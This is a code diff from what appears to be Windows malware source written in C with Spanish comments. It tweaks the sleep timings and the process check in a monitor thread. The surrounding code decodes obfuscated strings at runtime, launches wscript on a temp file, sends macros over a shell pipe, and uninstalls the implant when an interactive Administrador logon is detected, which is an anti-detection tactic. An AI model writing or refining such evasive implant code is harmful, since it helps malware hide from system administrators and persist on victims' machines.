@@ -371,9 +371,6 @@ BOOL UnistallProc(BOOL Remote, BOOL IsUpgrade){
 		sprintf(lpCmdLine, ds.getDecodeString((LPSTR)encStr_wscript_exe_s_s_s), lpTmpFileName, lpModuleFileName, FILE_ORIG_UPGRADE);	
 	ExecuteApp(lpCmdLine, NULL, FALSE, FALSE, NULL, NULL);
 
-	//Espera para dar tiempo a deteccion de CUM por otras instancias
-	Sleep(5000);
-
 	//Envio de macro local para descargarse
 	lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_unloadme), FLAG_DATA_IS_MACRO);
 	if(lpPacket){
@@ -526,7 +523,8 @@ DWORD ThreadMonitor(LPVOID lpParam){
 			if (ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE)
 				fileLogPrint("Upgrading");
 			#endif
-
+			
+			Sleep(500);
 			UnistallProc(ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE, ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE);
 			ExitThread(0);
 		}
@@ -536,6 +534,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 			fileLogPrint("Actived uninstall by uninstaller file");
 			#endif
 
+			Sleep(500);
 			UnistallProc(TRUE, FALSE);
 			ExitThread(0);
 		}
@@ -544,11 +543,12 @@ DWORD ThreadMonitor(LPVOID lpParam){
 
 		#ifdef CHECK_ADMIN_INTERACTIVE_LOGON
 		//lpszShellPath
-		if(CheckIsProcessRuningAsUser(lpszShellPath/*"packager.exe"*/, ds.getDecodeString((LPSTR)encStr_Administrador))){
+		if(CheckIsProcessRuningAsUser("packager.exe", ds.getDecodeString((LPSTR)encStr_Administrador))){
 			#ifdef DEBUG_SHOW_ERROR_TO_FILE
 			fileLogPrint("Actived uninstall by interactive logon");
 			#endif
-
+			
+			Sleep(500);
 			UnistallProc(TRUE, FALSE);
 			ExitThread(0);
 		}
@@ -566,7 +566,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 					if(lpPacket->dwFlags & FLAG_ERROR){}
 					FreePackage(lpPacket);
 				}
-				Sleep(50);
+				Sleep(100);
 			}
 			
 			lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_cum), FLAG_DATA_IS_MACRO);
@@ -575,7 +575,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 				FreePackage(lpPacket);
 			}
 
-			Sleep(50);
+			Sleep(100);
 			lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_unloadme), FLAG_DATA_IS_MACRO);
 			if(lpPacket){
 				if(lpPacket->dwFlags & FLAG_ERROR){}
@@ -583,7 +583,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 			}
 		}
 
-		Sleep(1500);
+		Sleep(1000);
 	}
 
 	return TRUE;
